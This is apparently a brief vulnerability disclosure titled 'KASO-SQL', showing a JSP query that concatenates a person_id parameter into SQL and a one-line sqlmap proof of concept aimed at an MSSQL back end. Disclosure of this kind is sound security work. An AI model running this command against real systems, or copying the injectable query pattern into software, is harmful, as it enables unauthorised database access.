# KASO-SQL


Impact Code

    <%}
    rs.close();
      sql = "select a.classid,a.name,b.popedom from oa_cardclass a,oa_card_popedom b where a.classid=b.classid and b.person_id='"+person_id+"'";  
      rs=DBmenu.executeQuery(sql); 
    %>


poc:
python sqlmap.py -m ./1.txt  --random-agent --dbms=mssql --current-user

![Uploading image.png…]()

